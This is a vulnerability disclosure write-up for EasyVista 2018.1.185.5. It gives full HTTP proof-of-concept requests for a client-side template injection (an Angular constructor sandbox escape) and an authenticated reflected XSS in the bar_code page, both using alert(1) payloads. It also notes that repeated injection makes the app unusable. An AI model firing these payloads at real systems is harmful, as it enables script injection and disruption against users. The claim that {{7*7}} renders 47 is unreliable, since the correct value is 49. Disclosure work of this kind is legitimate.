# EasyVista

## easyvista 2018.1.185.5 - CVE-XXX 

* Description : Client Side Template Injection
* Affected version : 2018.1.185.5

### Information

To make this PoC, I just installed the software (`https://www.easyvista.com/`)

* Vulnerability Type : CSTI (because using Angular 1.6)

### POC 

First of all, you can check your version using this URL `xxx.com/version` you will have this kind of output :

<img width="1280" alt="version" src="https://raw.githubusercontent.com/jenaye/EasyVista/master/version.png">


While logged in, you can now edit your menu, by clicking on "add new field".
Just intercept the request and change the value of the key `pageDirection` like in the following exemple :


```
POST /s/index.php?timestamp=1600176252228&name=com.xxxx.5f084ca4b1ac6&ajax&user=nepasrepondre%xxxx.com&action=call|fetchContent&urlid=%7B%22id%22%3A%221614674865e41c00ae6f85%22%2C%22fqdn%22%3A%22com.easyvista.core.plugdb.PlugDBEasyvista%22%2C%22nav%22%3A%22%7Cfirst%22%7D HTTP/1.1
Host: xxxx.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://b4help.xxxx.team/s/portail
Content-Type: application/json;charset=utf-8
Content-Length: 4907
Origin: https://b4help.xxxx.team
Connection: close
Cookie: PHPSESSID=a02fabf994eedfca123cc5330e30456c; com.xxxx.5f084ca2c2c6=5e46af4ABC

{"name":"com.xxxx.5f084ca2b1ac6","widgetClassName":"com.easyvista.core.plugdb.PlugDBEasyvista","properties":[{"name":"connector","type":"connector","accessType":2,"value":"alias_b57d8783c3ef11e4bba1f01faf66969f"},{"name":"jsonContent","type":"memo","accessType":4,"value":null},{"name":"filtersAndViews","type":"object","accessType":4,"value":null},{"name":"sortOrdersValues","type":"object","accessType":4,"value":""},{"name":"query","type":"combo","accessType":2,"value":"{913655A9-A4FE-4A71-8642-9A64D7B46A2D}"},{"name":"filter","type":"combo","accessType":2,"value":"{E3A875C1-C5D3-4C7F-8CF8-E25D1B4E6148}"},{"name":"view","type":"combo","accessType":2,"value":"{F923D560-8C1A-4BB4-A177-424B641F57E0}"},{"name":"filterField","type":"combo","accessType":2,"value":""},{"name":"filterValue","type":"string","accessType":2,"value":""},{"name":"sortOrderAggregated","type":"combo","accessType":2,"value":""},{"name":"sortOrderAggregatedType","type":"combo","accessType":2,"value":""},{"name":"sortOrder","type":"combo","accessType":2,"value":""},{"name":"sortOrderType","type":"combo","accessType":2,"value":""},{"name":"masterDatasource","type":"widget","accessType":2,"value":""},{"name":"masterField","type":"combo","accessType":2,"value":""},{"name":"detailField","type":"combo","accessType":2,"value":""},{"name":"expandLevel","type":"int","accessType":4,"value":""},{"name":"noDataByDefault","type":"boolean","accessType":2,"value":false},{"name":"fieldTypes","type":"fields_datasource","accessType":2,"value":[{"fieldname":"SD_CATALOG.CODE","columnIndex":0,"customLabel":"Service : Code","hidden":false,"dataType":"string","config":null,"formatError":false},{"fieldname":"SD_CATALOG.TITLE_$lng","columnIndex":1,"customLabel":"LibellÃ© du Service (dernier niveau)","hidden":false,"dataType":"string","config":null,"formatError":false},{"fieldname":"{* SMO_TREE_GET_PATH( 'SD_CATALOG', SD_CATALOG.SD_CATALOG_ID, '/', 0, 0, 0,0) @ALIAS@*}","columnIndex":2,"customLabel":"LibellÃ© du Service (complet)","hidden":false,"dataType":"none","config":null,"formatError":false},{"fieldname":"SD_CATALOG.DESCRIPTION_$lng","columnIndex":3,"customLabel":"Note","hidden":false,"dataType":"none","config":null,"formatError":false},{"fieldname":"SD_CATALOG.MAX_QTY","columnIndex":4,"customLabel":"QuantitÃ© maximale","hidden":false,"dataType":"integer","config":{"thousandsSeparator":"noSeparator"},"formatError":false},{"fieldname":"SD_SLA.NAME_$lng","columnIndex":5,"customLabel":"SLA","hidden":false,"dataType":"string","config":null,"formatError":false},{"fieldname":"SD_CATALOG.NET_PRICE","columnIndex":6,"customLabel":"Montant refacturÃ©","hidden":false,"dataType":"float","config":{"thousandsSeparator":"noSeparator","decimalsSeparator":"."},"formatError":false},{"fieldname":"AM_NET_PRICE_CURRENCY.CURRENCY","columnIndex":7,"customLabel":"Montant refacturÃ© : Devise","hidden":false,"dataType":"string","config":null,"formatError":false},{"fieldname":"SD_CATALOG.END_DATE","columnIndex":8,"customLabel":"Fin de disponibilitÃ©","hidden":false,"dataType":"datetime","config":{"dateFormat":"d/m/Y","timeFormat":"H:i:s","epochFormat":null},"formatError":false},{"fieldname":"SD_CATALOG.BIG_PICTURE_PATH","columnIndex":9,"customLabel":"Image","hidden":false,"dataType":"string","config":null,"formatError":false}]},{"name":"selectFirstRow","type":"boolean","accessType":2,"value":true},{"name":"noDataLabel","type":"htmleditor","accessType":2,"value":""},{"name":"autoRefresh","type":"duration","accessType":2,"value":""},{"name":"additionalFields","type":"array","accessType":4,"value":["SD_SLA.NAME_$lng"]},{"name":"session","type":"object","accessType":1,"value":{"memo":null,"logoutUrl":""}},{"name":"name","type":"string","accessType":4,"value":"Get"},{"name":"editable","type":"boolean","accessType":4,"value":true},{"name":"privateProperty","type":"object","accessType":4,"value":null},{"name":"templateCreator","type":"string","accessType":4,"value":null},{"name":"guid","type":"guid","accessType":1,"value":"1614674865e41c00ae6f85"},{"name":"widgetname","type":"string","accessType":1,"value":"PlugDBEasyvista"},{"name":"breakpoints","type":"array","accessType":1,"value":[]},{"name":"hideWidgets","type":"array","accessType":4,"value":[]}],"fct":"fetchContent","params":{"filter":"{E3A875C1-C5D3-4C7F-8CF8-E25D1B4E6148}","incrementalFilter":"","isAggregatedData":false,"additionalFields":["SD_SLA.NAME_$lng"],"detailField":null,"detailFieldFilter":"","masterTable":"","EzvClientPageParam":{"navigatorGuid":"","pageDirection":"first"},"EzvClientIncrementalFilterParam":{"criteria":"{{0[a='constructor'][a]('alert(1)')()}}","fields":["SD_CATALOG.TITLE_FR","SD_CATALOG.CODE","SD_CATALOG.DESCRIPTION_FR"]},"EzvClientOrderParam":{"sortOrderAggregated":"","sortOrderAggregatedType":"","sortOrder":"","sortOrderType":""}},"stackId":"Get","action":"call","referer":"https://xxxx.com/s/portail"}
```

There is a poc with `{{ 7*7 }}` which renders `47` : 
<img width="1280" alt="poc1" src="https://raw.githubusercontent.com/jenaye/EasyVista/master/poc.png">


### Preview

<img width="1280" alt="poc2-based" src="https://raw.githubusercontent.com/jenaye/EasyVista/master/poc2.png">



>Note : The menu is called in loop, so if you make `alert(1)` after ~30 XSS, the App will be unusable.


The payload `{{constructor.constructor('alert(1)')()}}`




## Easyvista 2018.1.185.5 - CVE-XXX 

* Description : Allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser
* Affected version : 2018.1.185.5

### Information

To make this PoC, I just installed the software (`https://www.easyvista.com/`)

* Vulnerability Type : XSS Reflected ( Authentificated )

### POC 

There is an exemple with alert into `bar_code` page: 

```
POST /include/bar_code.php?PHPSESSID=6314962ba5a60b891ef7864644d901a1&internalurltime=1600091040&alias=Intitul%C3%A9 HTTP/1.1
Host: xxxx.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://xxxx.com/include/bar_code.php?PHPSESSID=7314962ba5a60b891ef7864644d801a2&alias=Intitul%C3%A9
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: https:://xxxx.com
Connection: close
Cookie: PHPSESSID=7314962ba5a60b891ef7864644d801a2; ezv_theme=light-default; menu_type=global; uid_861b0cfd443c6e0b363709f6836824419c5=1600090871; uid_73d5682f9dbe5f8a9a0fddba0d449b8921e97709=1600091040; cookie_account=50004
Upgrade-Insecure-Requests: 1

memo_barcode=</script><script>alert(1)</script>&comboSeparator=TAB
```

### Preview 

<img width="1280" alt="poc-xss" src="https://raw.githubusercontent.com/jenaye/EasyVista/master/xss-poc.png">